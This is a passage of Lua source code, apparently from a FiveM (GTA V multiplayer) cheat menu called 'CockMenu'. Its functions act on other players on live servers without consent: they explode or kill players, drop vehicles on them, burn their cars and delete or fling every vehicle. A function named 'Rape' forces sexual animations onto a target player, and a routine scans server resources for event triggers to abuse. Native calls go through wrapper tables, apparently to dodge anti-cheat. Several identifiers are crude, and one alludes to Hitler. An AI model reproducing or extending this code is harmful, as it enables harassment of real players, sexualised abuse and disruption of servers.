                   Fatasf.n.DrawRect(0.49, 0.3495, 0.141, 0.027, Red, Green, Blue, 255)
                   Fatasf.n.DrawRect(0.49, 0.35, 0.14, 0.025, 19, 20, 22, 255)
                   Functions.f.DrawTextTest('RGBA: '..Red..', '..Green..', '..Blue..', '..Alpha, false, 0.35, 0, 0.46, 0.336)
                   Fatasf.n.DrawRect(0.552, 0.3495, 0.015, 0.023, Red, Green, Blue, 255)
               
       
                   Functions.f.DrawTextTest('Colour:', false, 0.35, 0, 0.53, 0.336)
               
                   if CockT.Global.ListButton(0.552, 0.3495, false, 129, 255, 0) then
                       ShowList = not ShowList
                   end
       
               --[[if CockT.Global.RGButton('Done', 0.443, 0.612, false, 19, 20, 22) then
                   Fatasf.n.Leprint("Click [`ENTER`] to save")
               end
               if CockT.Global.RGButton('Cancel', 0.465, 0.612, false, 19, 20, 22) then
                   Rv2 = 255
                   Gv2 = 255
                   Bv2 = 255
               end]]
       
               if Fatasf.n.IsDisabledControlPressed(0, 191) then
                   Rv2 = Red
                   Gv2 = Green
                   Bv2 = Blue
                   Av2 = Alpha
                   end
               end
               
               end,
   
               TpToWaypoint = function()
                   local wp = Fatasf.n.GetFirstBlipInfoId(8) 
                   if Fatasf.n.DoesBlipExist(wp) then          
                       wpC = Fatasf.n.GetBlipInfoIdCoord(wp)       
                       for cc = 1, 1000 do            
                           CockT.Inv["Invoke"](CockT.Natives['SetPedCoordsKeepVehicle'], Fatasf.n.PlayerPedId(), wpC["x"], wpC["y"], cc + 0.0)            
                           gZ, zPos = Fatasf.n.GetGroundZFor_3dCoord(wpC["x"], wpC["y"], cc + 0.0)            
                           if gZ then                
                               CockT.Inv["Invoke"](CockT.Natives['SetPedCoordsKeepVehicle'], Fatasf.n.PlayerPedId(), wpC["x"], wpC["y"], cc + 0.0)                
                               break            
                           end            
                           CockT.Inv["Wait"](0)
                       end
                   end
               end,
       
   
               EnableAllEngines = function()
                   for vehicle in Fatasf.n.EnumerateVehicles() do
                        Fatasf.n.SetVehicleEngineOn(vehicle, true, true, true)
                   end
               end,
               EnableAllSirens = function()
                   for vehicle in Fatasf.n.EnumerateVehicles() do
                       Fatasf.n.SetVehicleEngineOn(vehicle, true, true, true)
                        Fatasf.n.TriggerSiren(vehicle)
                        Fatasf.n.SetVehicleSiren(vehicle, true)
                   end
               end,
               TugAllPlayers = function()
                  for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local ped = Fatasf.n.GetPlayerPed(i) 
                       local coords = Fatasf.n.GetEntityCoords(ped)
                       while not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey("tug")) do
                           Fatasf.n.RequestModel(Fatasf.n.GetHashKey("tug"))
                           CockT.Inv["Wait"](1)
                       end
                       local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey("tug"), coords.x, coords.y, coords.z, 90.0, 1, 1)
                   end
               end,
               killallpeds = function()
                   for peds in Fatasf.n.EnumeratePeds() do
                       if Fatasf.n.IsPedAPlayer(peds) ~= true and peds ~= Fatasf.n.PlayerPedId() then
                           Fatasf.n.RequestControlOnce(peds)
                           Fatasf.n.SetEntityHealth(peds, 0)
                       end
                   end
               end,
               IsPlayerInFvckinDooogInvincibleglifeshit = function(player)
                   local isgod = CockT.Inv["Invoke"](CockT.Natives['GetPlayerInvincible_2'], player)
                   if isgod == 1 then
                       return "~g~Yes~s~"
                   else
                       return "~r~No~s~"
                   end
               end,
               PounderPlayers = function(players, howm)
                   for i = 0, howm - 1 do
                       local ped = Fatasf.n.GetPlayerPed(players)
                       local coords = Fatasf.n.GetEntityCoords(ped)
                       while not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey("Pounder")) do
                       Fatasf.n.RequestModel(Fatasf.n.GetHashKey("Pounder"))
                       CockT.Inv["Wait"](1)
                       end
                       local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey("Pounder"), coords.x, coords.y, coords.z, 90.0, true, true)
                   end
               end,
               FormatCoord = function(coord)
                   if coord == nil then
                       return "unknown"
                   end
               
                   return CockT.Math.tonumber(CockT.Strings.format("%.2f", coord))
               end,
               FlipVehicle = function()
                   local cars = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
                   Fatasf.n.SetVehicleOnGroundProperly(cars)
               end,
               Cage = function(player)
                   --[[local ped = Fatasf.n.GetPlayerPed(player)
                   local coords = Fatasf.n.GetEntityCoords(ped)
                   local inveh = Fatasf.n.IsPedInAnyVehicle(ped)
                   if inveh then
                       local obj =
                           Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                           coords.x - 6.8,
                           coords.y + 1,
                           coords.z - 1.5,
                           0,
                           1,
                           1
                       )
                       Fatasf.n.SetEntityHeading(obj, 90.0)
                       Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                           coords.x - 0.6,
                           coords.y + 6.8,
                           coords.z - 1.5,
                           0,
                           1,
                           1
                       )
                       Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                           coords.x - 0.6,
                           coords.y - 4.8,
                           coords.z - 1.5,
                           0,
                           1,
                           1
                       )
                       local obj2 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                           coords.x + 4.8,
                           coords.y + 1,
                           coords.z - 1.5,
                           0,
                           1,
                           1
                       )
                       Fatasf.n.SetEntityHeading(obj2, 90.0)
                       local obj =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                           coords.x - 6.8,
                           coords.y + 1,
                           coords.z + 1.3,
                           0,
                           1,
                           1
                       )
                       Fatasf.n.SetEntityHeading(obj, 90.0)
                       Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                           coords.x - 0.6,
                           coords.y + 6.8,
                           coords.z + 1.3,
                           0,
                           1,
                           1
                       )
                       Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                           coords.x - 0.6,
                           coords.y - 4.8,
                           coords.z + 1.3,
                           0,
                           1,
                           1
                       )
                       local obj2 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_const_fence03b_cr"),
                           coords.x + 4.8,
                           coords.y + 1,
                           coords.z + 1.3,
                           0,
                           1,
                           1
                       )
                       Fatasf.n.SetEntityHeading(obj2, 90.0)
                   else
                       obj =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                           coords.x - 0.6,
                           coords.y - 1,
                           coords.z - 1,
                           1,
                           1,
                           1
                       )
                       Fatasf.n.FreezeEntityPosition(obj, true)
                       obj2 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                           coords.x - 0.55,
                           coords.y - 1.05,
                           coords.z - 1,
                           1,
                           1,
                           1
                       )
                       Fatasf.n.SetEntityHeading(obj2, 90.0)
                       Fatasf.n.FreezeEntityPosition(obj2, true)
                       obj3 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                           coords.x - 0.6,
                           coords.y + 0.6,
                           coords.z - 1,
                           1,
                           1,
                           1
                       )
                       Fatasf.n.FreezeEntityPosition(obj3, true)
                       obj4 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                           coords.x + 1.05,
                           coords.y - 1.05,
                           coords.z - 1,
                           1,
                           1,
                           1
                       )
                       Fatasf.n.SetEntityHeading(obj4, 90.0)
                       Fatasf.n.FreezeEntityPosition(obj4, true)
                       obj5 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                           coords.x - 0.6,
                           coords.y - 1,
                           coords.z + 1.5,
                           1,
                           1,
                           1
                       )
                       Fatasf.n.FreezeEntityPosition(obj5, true)
                       obj6 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                           coords.x - 0.55,
                           coords.y - 1.05,
                           coords.z + 1.5,
                           1,
                           1,
                           1
                       )
                       Fatasf.n.SetEntityHeading(obj6, 90.0)
                       Fatasf.n.FreezeEntityPosition(obj6, true)
                       obj7 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                           coords.x - 0.6,
                           coords.y + 0.6,
                           coords.z + 1.5,
                           1,
                           1,
                           1
                       )
                       Fatasf.n.FreezeEntityPosition(obj7, true)
                       obj8 =
                           Fatasf.n.CreateObject(
                           Fatasf.n.GetHashKey("prop_fnclink_03gate5"),
                           coords.x + 1.05,
                           coords.y - 1.05,
                           coords.z + 1.5,
                           1,
                           1,
                           1
                       )
                       Fatasf.n.SetEntityHeading(obj8, 90.0)
                       Fatasf.n.FreezeEntityPosition(obj8, true)
                   end]]
               end,
               FlyAllVehs = function()
                   for vehicle in Fatasf.n.EnumerateVehicles() do
                       Fatasf.n.NetworkRequestControlOfEntity(vehicle)
                       CockT.Inv["Invoke"](CockT.Natives['ApplyForceToEntity'], vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                   end
               end,
   
               
               DelAllVehs = function()
                   for vehicle in Fatasf.n.EnumerateVehicles() do
                       Fatasf.n.DeleteEntity(vehicle)
                   end	
               end,
               ExplodeAllPlayer = function()
                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do  
                       Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(i)), 8, 100.0, true, false, 0.0) 
                   end
               end,
               
               Rape = function(target)
                   CockT.Inv["Thread"](
                       function()
                           if Fatasf.n.IsPedInAnyVehicle(
                                   Fatasf.n.GetPlayerPed(target),
                                   true
                               )
                            then
                               local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(target), true)
                               while not Fatasf.n.NetworkHasControlOfEntity(veh) do
                                   Fatasf.n.NetworkRequestControlOfEntity(veh)
                                   CockT.Inv["Wait"](0)
                               end
                               CockT.Inv["Invoke"](CockT.Natives["SetEntityAsMissionEntity"], veh, true, true)
                               CockT.Inv["Invoke"](CockT.Natives["DeleteVehicle"], veh)
                               Fatasf.n.DeleteEntity(veh)
                           end
                           count = -0.2
                           for b = 1, 3 do
                               x, y, z =
                                   CockT.Strings.tunpack(
                                   Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(target), true)
                               )
                               local pp =
                               Fatasf.n.ClonePed(
                                   Fatasf.n.GetPlayerPed(target),
                                   1,
                                   1,
                                   1
                               )
                               CockT.Inv["Invoke"](CockT.Natives["SetEntityAsMissionEntity"], bD, true, true)
                               Fatasf.n.AttachEntityToEntity(pp, Fatasf.n.GetPlayerPed(target), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                               CockT.Inv["Invoke"](
                                   CockT.Natives["ClearPedTasks"],
                                   Fatasf.n.GetPlayerPed(target)
                               )
                               Fatasf.n.TaskPlayAnim(
                                   Fatasf.n.GetPlayerPed(target),
                                   "rcmpaparazzo_2",
                                   "shag_loop_poppy",
                                   2.0,
                                   2.5,
                                   -1,
                                   49,
                                   0,
                                   0,
                                   0,
                                   0
                               )
                               Fatasf.n.SetPedKeepTask(pp)
                               Fatasf.n.TaskPlayAnim(
                                   pp,
                                   "rcmpaparazzo_2",
                                   "shag_loop_a",
                                   2.0,
                                   2.5,
                                   -1,
                                   49,
                                   0,
                                   0,
                                   0,
                                   0
                               )
                               Fatasf.n.SetEntityInvincible(pp, true)
                               count = count - 0.4
                           end
                       end
                   )
               end,
               KillPlayer = function(player)
                   local ped = Fatasf.n.GetPlayerPed(player)
                   local location = Fatasf.n.GetEntityCoords(ped)
                   local dest = Fatasf.n.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
                   local org = Fatasf.n.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
                   Fatasf.n.ShootSingleBulletBetweenCoords(org, dest, 50.0, true, Fatasf.n.GetHashKey('WEAPON_PISTOL'), Fatasf.n.PlayerPedId(), true, false, 10000.0)
               end,
               SilentKill = function(player)
                   local ped = Fatasf.n.GetPlayerPed(player)
               end,
               
               RotationToDirection = function(Rotationation)
                   return CockT.Strings.vector3(
                       -CockT.Math.sin(CockT.Math.rad(Rotationation.z)) *
                           CockT.Math.abs(CockT.Math.cos(CockT.Math.rad(Rotationation.x))),
                       CockT.Math.cos(CockT.Math.rad(Rotationation.z)) *
                           CockT.Math.abs(CockT.Math.cos(CockT.Math.rad(Rotationation.x))),
                       CockT.Math.sin(CockT.Math.rad(Rotationation.x))
                   )
               end,
               ShitRain = function(target, model, result)
                   CockT.Inv["Thread"](
                       function(result)
                           for tye = 0, result do
                               local VehicleHash = Fatasf.n.GetHashKey(model)
                               Fatasf.n.RequestModel(VehicleHash)
                               local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(target)))
                               while not Fatasf.n.HasModelLoaded(VehicleHash) do
                                   Fatasf.n.RequestModel(VehicleHash)
                                   CockT.Inv["Wait"](15)
                               end
                               local cockmenu = {p = 82, s = 80}
                               local SpawnedVeh =
                                   Fatasf.n.CreateVehicle(
                                   VehicleHash,
                                   x,
                                   y,
                                   z + 20.0,
                                   0.0,
                                   true,
                                   false
                               )
                               CockT.Inv["Invoke"](CockT.Natives["SetVehicleColours"], SpawnedVeh, cockmenu.p, cockmenu.s)
                               Fatasf.n.SetVehicleNumberPlateText(SpawnedVeh, "Cock Menu")
                               Fatasf.n.SetEntityVelocity(SpawnedVeh, 0.0, 0.0, -100.0)
                           end
                       end
                   )
               end,
               instructbutton = function()
                   local dW = {
                       {["label"] = "Change Speed", ["button"] = "~INPUT_SPRINT~"},
                       {["label"] = "Down", ["button"] = "~INPUT_HUD_SPECIAL~"},
                       {["label"] = "Up", ["button"] = "~INPUT_COVER~"},
                       {["label"] = "Back", ["button"] = "~INPUT_MOVE_DOWN_ONLY~"},
                       {["label"] = "Forward", ["button"] = "~INPUT_MOVE_UP_ONLY~"}
                   }
                   dX = CockT.Inv["Invoke"](CockT.Natives["RequestScaleformMovie"], "instructional_buttons")
                   while not CockT.Inv["Invoke"](CockT.Natives["HasScaleformMovieLoaded"], dX) do
                       CockT.Inv["Wait"](0)
                   end
                   for dY, dZ in CockT.Math.ipairs(dW) do
                       CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunction"], dX, "SET_DATA_SLOT")
                       CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunctionParameterInt"], dY - 1)
                       CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieMethodParameterButtonName"], dZ["button"])
                       CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunctionParameterString"], dZ["label"])
                       CockT.Inv["Invoke"](CockT.Natives["PopScaleformMovieFunctionVoid"])
                   end
                   CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunction"], dX, "DRAW_INSTRUCTIONAL_BUTTONS")
                   CockT.Inv["Invoke"](CockT.Natives["PushScaleformMovieFunctionParameterInt"], -1)
                   CockT.Inv["Invoke"](CockT.Natives["PopScaleformMovieFunctionVoid"])
                   CockT.Inv["Invoke"](CockT.Natives["DrawScaleformMovieFullscreen"], dX, 255, 255, 255, 255)
               end,
               GiveAllWeapons = function()
                   for weapo = 1, #CockT.Weapons do
                       Fatasf.n.GiveDelayedWeaponToPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey("WEAPON_" .. CockT.Weapons[weapo]), 255, false)
                   end
               end,
               RemoveAllWeapons = function()
                   CockT.Inv["Invoke"](CockT.Natives["RemoveAllPedWeapons"], Fatasf.n.PlayerPedId(), false)
               end,
               CamFwdVect = function(camf)
                   local coords = Fatasf.n.GetCamCoord(camf)
                   local rot = Fatasf.n.GetCamRot(camf, 0)
                   return CockT.Global.RotToQuat(rot) * CockT.Strings.vector3(0.0, 1.0, 0.0)
               end,
               CamRightVect = function(camf)
                   local coords = Fatasf.n.GetCamCoord(camf)
                   local rot = Fatasf.n.GetCamRot(camf, 0)
                   local qrot = quat(0.0, CockT.Strings.vector3(rot.x, rot.y, rot.z))
                   return CockT.Global.RotToQuat(rot) * CockT.Strings.vector3(1.0, 0.0, 0.0)
               end,
   
               LoadGif1 = function()
                   Fatasf.n.CreateRuntimeTextureFromDuiHandle(Fatasf.n.CreateRuntimeTxd("batakmenu"), "batakfrajer", Fatasf.n.GetDuiHandle(Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/agUiPTGO.gif", 400, 107)))
               end,
               LoadGifMoscow = function()
                   -- no polish cow ;(
                   --[[ Fatasf.n.CreateRuntimeTextureFromDuiHandle(Fatasf.n.CreateRuntimeTxd("cock_moscow"), "vertissotraperdamnshit", Fatasf.n.GetDuiHandle(Fatasf.n.CreateAnDui("https://cock.menu/music/mp4moscow.mp4", 640, 360))) ]]
               end,
               LoadGifLSC = function()
                   Fatasf.n.CreateRuntimeTextureFromDuiHandle(Fatasf.n.CreateRuntimeTxd("czolgista"), "batakfrajer", Fatasf.n.GetDuiHandle(Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/cdaOvZf1.gif", 400, 107)))
               end,
               LoadGif2 = function()
                   Fatasf.n.CreateRuntimeTextureFromDuiHandle(Fatasf.n.CreateRuntimeTxd("batakmenu"), "batakfrajer", Fatasf.n.GetDuiHandle(Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/HbGudvZJ.gif", 400, 235)))
               end,
               LoadGif3 = function()
                   Fatasf.n.CreateRuntimeTextureFromDuiHandle(Fatasf.n.CreateRuntimeTxd("batakmenu"), "batakfrajer",  Fatasf.n.GetDuiHandle(Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/hOK3aUyT.gif", 400, 107)))
               end,
               LoadGif4 = function()
                   Fatasf.n.CreateRuntimeTextureFromDuiHandle(Fatasf.n.CreateRuntimeTxd("batakmenu"), "batakfrajer", Fatasf.n.GetDuiHandle(Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/UL3Y4XZH.gif", 500, 281)))
               end,
               
               BurnPlayerCar = function(player)
                   local gox_dict = "core"
                   Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
                   while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do						
                       CockT.Inv["Wait"](500)				
                   end
                   if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), false)) then
                       Fatasf.n.UseParticleFxAsset(gox_dict)							
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire",Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)),0,0,0,1.0,0,0,0)			
                   end 
               end,
               SpawnBitch = function(playerped)
                   if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(playerped), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(playerped), false)) then
                       local veh = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.GetPlayerPed(playerped))
                       local model = Fatasf.n.GetHashKey("s_f_y_stripper_01")
                       Fatasf.n.RequestModel(model)
                       while not Fatasf.n.HasModelLoaded(model) do
                           CockT.Inv["Wait"](1)
                       end
                       local cpiv = Fatasf.n.CreatePedInsideVehicle(veh, 4, model, 0, true, false)
                       
                       end
                   end,
               
               MenuButton = function(text, id, subText)
                   if not currentMenu then
                       return
                   end
                   if currentMenu.currentOption == optionCount + 1 then
                       pressed = tf.SpriteMenuButton(text, 'trafficcam', 'radar_centre', 255, 255, 255, 255)
                   else
                       pressed = tf.SpriteMenuButton(text, 'trafficcam', 'radar_centre', 255, 255, 255, 255)
                   end
                   if pressed then
                       currentMenu.currentOption = optionCount
                       tf.setMenuVisible(currentMenu.id, false)
                       tf.setMenuVisible(id, true, true)
                   end
                   return pressed
               end,
               CheckBox = function(text, checked, callback)
                   if not currentMenu then
                       return
                   end
                   name = nil
                   if currentMenu.currentOption == optionCount + 1 then
                       name = checked and "shop_box_tick" or "shop_box_blank"
                   else
                       name = checked and "shop_box_tick" or "shop_box_blank"
                   end
                   local pressed = tf.SpriteButton(0.001, 0.001, text .. "  ", "commonmenu", name)
                   if pressed then
                       checked = not checked
                       if callback then
                           callback(checked)
                       end
                   end
                   return pressed
               end,
               ComboBox = function(text, items, currentIndex, selectedIndex, callback)
                   if not currentMenu then
                       return
                   end
                   local itemsCount = #items
                   local selectedItem = items[currentIndex]
                   local isCurrent = currentMenu.currentOption == optionCount + 1
                   local selectedIndex = selectedIndex or currentIndex
                   if itemsCount > 1 and isCurrent then
                       selectedItem = "- " .. CockT.Strings.tostring(selectedItem) .. " -"
                   end
                   local pressed = tf.Button(text, selectedItem)
                   if pressed then
                       selectedIndex = currentIndex
                   elseif isCurrent then
                       if currentKey == keys.v2 then
                           if currentIndex > 1 then
                               currentIndex = currentIndex - 1
                           else
                               currentIndex = itemsCount
                           end
                       elseif currentKey == keys.v3 then
                           if currentIndex < itemsCount then
                               currentIndex = currentIndex + 1
                           else
                               currentIndex = 1
                           end
                       end
                   end
                   if callback then
                       callback(currentIndex, selectedIndex)
                   end
                   return pressed, currentIndex
               end,
               Display = function()
                   if currentMenu then
                       Fatasf.n.DisableControlAction(0, keys.v2, true)
                       Fatasf.n.DisableControlAction(0, keys.up, true)
                       Fatasf.n.DisableControlAction(0, keys.down, true)
                       Fatasf.n.DisableControlAction(0, keys.v3, true)
                       Fatasf.n.DisableControlAction(0, keys.back, true)
                       if currentMenu.aboutToBeClosed then
                           tf.CloseMenu()
                       else
                           CockT.Inv["Invoke"](CockT.Natives["ClearAllHelpMessages"])
                           tf.drawTitle()
                           tf.drawSubTitle()
                           currentKey = nil
                           if Fatasf.n.IsDisabledControlJustReleased(0, keys.down) then
                               Fatasf.n.PlaySoundFrontend(
                                   -1,
                                   "NAV_UP_DOWN",
                                   "HUD_FRONTEND_DEFAULT_SOUNDSET",
                                   true
                               )
                               if currentMenu.currentOption < optionCount then
                                   currentMenu.currentOption = currentMenu.currentOption + 1
                               else
                                   currentMenu.currentOption = 1
                               end
                           elseif Fatasf.n.IsDisabledControlJustReleased(0, keys.up) then
                               Fatasf.n.PlaySoundFrontend(
                                   -1,
                                   "NAV_UP_DOWN",
                                   "HUD_FRONTEND_DEFAULT_SOUNDSET",
                                   true
                               )
                               if currentMenu.currentOption > 1 then
                                   currentMenu.currentOption = currentMenu.currentOption - 1
                               else
                                   currentMenu.currentOption = optionCount
                               end
                           elseif Fatasf.n.IsDisabledControlJustReleased(0, keys.v2) then
                               currentKey = keys.v2
                           elseif Fatasf.n.IsDisabledControlJustReleased(0, keys.v3) then
                               currentKey = keys.v3
                           elseif CockT.Inv["Invoke"](CockT.Natives["IsControlJustReleased"], 0, keys.select) then
                               currentKey = keys.select
                           elseif Fatasf.n.IsDisabledControlJustReleased(0, keys.back) then
                               if menus[currentMenu.previousMenu] then
                                   tf.setMenuVisible(currentMenu.previousMenu, true)
                                   Fatasf.n.PlaySoundFrontend(
                                       -1,
                                       "BACK",
                                       "HUD_FRONTEND_DEFAULT_SOUNDSET",
                                       true
                                   )
                               else
                                   tf.CloseMenu()
                               end
                           end
                           optionCount = 0
                       end
                   end
               end,
               HailHitla = function()
                   mp_pointing = false
   
                   startPointing = function()
                       local ped = Fatasf.n.PlayerPedId()
                       Fatasf.n.RequestAnimDict("anim@mp_point")
                       while not Fatasf.n.HasAnimDictLoaded("anim@mp_point") do
                           CockT.Inv["Wait"](0)
                       end
                       Fatasf.n.SetPedCurrentWeaponVisible(ped, 0, 1, 1, 1)
                       Fatasf.n.SetPedConfigFlag(ped, 36, 1)
                       Fatasf.n.TaskMoveNetworkByName(ped, "task_mp_pointing", 0.5, 0, "anim@mp_point", 24)
                       Fatasf.n.RemoveAnimDict("anim@mp_point")
                   end
   
                   stopPointing = function()
                       local ped = Fatasf.n.PlayerPedId()
                       Fatasf.n.RequestTaskMoveNetworkStateTransition(ped, "Stop")
                       if not Fatasf.n.IsPedInjured(ped) then
                           Fatasf.n.ClearPedSecondaryTask(ped)
                       end
                       if not Fatasf.n.IsPedInAnyVehicle(ped, 1) then
                           Fatasf.n.SetPedCurrentWeaponVisible(ped, 1, 1, 1, 1)
                       end
                       Fatasf.n.SetPedConfigFlag(ped, 36, 0)
                       Fatasf.n.ClearPedSecondaryTask(Fatasf.n.PlayerPedId())
                   end
   
   
                   CockT.Inv["Thread"](function()
                       while true do
                           CockT.Inv["Wait"](0)
   
                           if CockT.Inv["Invoke"](CockT.Natives['IsPedOnFoot'], Fatasf.n.PlayerPedId()) and not mp_pointing then
                               CockT.Inv["Wait"](200)
                               startPointing()
                               mp_pointing = true
                           end
   
                           if Fatasf.n.IsTaskMoveNetworkActive(Fatasf.n.PlayerPedId()) and not mp_pointing then
                               stopPointing()
                           end
                           if Fatasf.n.IsTaskMoveNetworkActive(Fatasf.n.PlayerPedId()) then
                               if not CockT.Inv["Invoke"](CockT.Natives['IsPedOnFoot'], Fatasf.n.PlayerPedId()) then
                                   stopPointing()
                               else
                                   local ped = Fatasf.n.PlayerPedId()
                                   local camPitch = Fatasf.n.GetGameplayCamRelativePitch()
                                   if camPitch < -70.0 then
                                       camPitch = -70.0
                                   elseif camPitch > 42.0 then
                                       camPitch = 42.0
                                   end
                                   camPitch = (camPitch + 70.0) / 112.0
   
                                   local camHeading = Fatasf.n.GetGameplayCamRelativeHeading()
                                   local cosCamHeading = Cos(camHeading)
                                   local sinCamHeading = Sin(camHeading)
                                   if camHeading < -180.0 then
                                       camHeading = -180.0
                                   elseif camHeading > 180.0 then
                                       camHeading = 180.0
                                   end
                                   camHeading = (camHeading + 180.0) / 360.0
                                   local blocked = 0
                                   local nn = 0
                                   local coords = Fatasf.n.GetOffsetFromEntityInWorldCoords(ped, (cosCamHeading * -0.2) - (sinCamHeading * (0.4 * camHeading + 0.3)), (sinCamHeading * -0.2) + (cosCamHeading * (0.4 * camHeading + 0.3)), 0.6)
                                   local ray = Fatasf.n.StartShapeTestCapsule(coords.x, coords.y, coords.z - 0.2, coords.x, coords.y, coords.z + 0.2, 0.4, 95, ped, 7);
                                   local nn,blocked,coords,coords = Fatasf.n.GetRaycastResult(ray)
                                   Fatasf.n.SetTaskMoveNetworkSignalFloat(ped, "Pitch", camPitch)
                                   Fatasf.n.SetTaskMoveNetworkSignalFloat(ped, "Heading", camHeading * -1.0 + 1.0)
                                   Fatasf.n.SetTaskMoveNetworkSignalBool(ped, "isBlocked", blocked)
                                   Fatasf.n.SetTaskMoveNetworkSignalBool(ped, "isFirstPerson", _cit_.InvokeNative(0xEE778F8C7E1142E2, _cit_.InvokeNative(0x19CAFA3C87F7C2FF)) == 4)
   
                               end
                           end
                       end
                   end)
   
               end,
               
               CurrentOption = function()
                   if currentMenu and optionCount ~= 0 then
                       return currentMenu.currentOption
                   end
                   return nil
               end,
               IsItemHovered = function()
                   if not currentMenu or optionCount == 0 then
                       return false
                   end
                   return currentMenu.currentOption == optionCount
               end,
               IsItemSelected = function()
                   return currentKey == keys.select and CockMeni.Functions.IsItemHovered()
               end,
               SetTitle = function(id, title)
                   tf.setMenuProperty(id, "title", title)
               end,
               SetSubTitle = function(id, text)
                   tf.setMenuProperty(id, "subTitle", CockT.Strings.upper(text))
               end,
               SetMenuStyle = function(id, style)
                   tf.setMenuProperty(id, "style", style)
               end,
               SetTitleColor = function(id, r, g, b, a)
                   tf.setStyleProperty(id, "titleColor", {r, g, b, a})
               end,
               SetTitleBackgroundColor = function(id, r, g, b, a)
                   tf.setStyleProperty(id, "titleBackgroundColor", {r, g, b, a})
               end,
               SetTitleBackgroundSprite = function(id, dict, name)
                   Fatasf.n.RequestStreamedTextureDict(dict)
                   tf.setStyleProperty(id, "titleBackgroundSprite", {dict = dict, name = name})
               end,
   
               PedRotation = function(entity, rotationOrder)
                   return Fatasf.n.GetEntityRotation(entity, rotationOrder, _cit_.ResultAsVector())
               end,
               GetRotation = function(v) 
                   return CockT.Strings.vector3(CockT.Math.deg(CockT.Math.atan2(v.z, #vector2(v.x, v.y))), 0.0, -CockT.Math.deg(CockT.Math.atan2(v.x, v.y))) 
               end,
               
               natRe = function()
                   local entcord = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId())
                   local cords = {
                       x = CockT.Global.mathround(entcord.x, 1),
                       y = CockT.Global.mathround(entcord.y, 1),
                       z = CockT.Global.mathround(entcord.z, 1)
                   }
                   CockT.Global.resPe(Fatasf.n.PlayerPedId(), cords, 0)
                   Fatasf.n.StopScreenEffect("DeathFailOut")
               end,
               
               UpdateAllTriggers = function()
                   Fatasf.n.Leprint("^1[^2CockMenu Logs^1] ^7Loading dynamic triggers...")
                   CockT.Inv["Thread"](
                       function()
                           CockT.Inv["Wait"](500)
                           local fitimeone = Fatasf.n.GetResources()
                           for kk, v in CockT.Math.ipairs(CockT.DynamicTriggers) do
                               for i = 0, #fitimeone do
                                   local script = CockT.Strings.lower(fitimeone[i])
                                   if type(v.resourcelooklike) == "table" then
                                       for E, pirs in CockT.Math.pairs(v.resourcelooklike) do
                                           if CockT.Strings.find(script, pirs) and Fatasf.n.GetResourcestatus(fitimeone[i]) then
                                               v.resource = fitimeone[i]
                                           end
                                       end
                                   else
                                       if CockT.Strings.find(script, v.resourcelooklike) and Fatasf.n.GetResourcestatus(fitimeone[i]) then
                                           v.resource = fitimeone[i]
                                       end
                                   end
                               end
                           end
